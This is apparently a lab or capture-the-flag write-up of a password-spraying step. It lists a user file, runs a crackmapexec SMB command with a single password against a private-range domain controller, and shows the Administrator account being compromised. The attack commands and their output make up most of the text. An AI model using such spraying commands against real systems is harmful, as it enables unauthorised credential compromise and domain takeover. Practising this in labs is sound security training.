# 🔑 Initial Access - Password Spraying

## Objective
Perform password spraying against domain users to discover valid credentials.

## Commands Used
```bash
# Create user list based on enumeration
cat > users.txt << EOF
john.doe
it.admin
svc.backup
Administrator
EOF

# Password spraying attack
crackmapexec smb 192.168.56.10 -u users.txt -p 'password@123' --continue-on-success
Results
text
[+] corp.local\Administrator:password@123 (Pwn3d!)
💥 Success
Found valid Domain Admin credentials! This provided full access to the domain controller.

📸 Evidence
https://screenshots/pwn3d.png
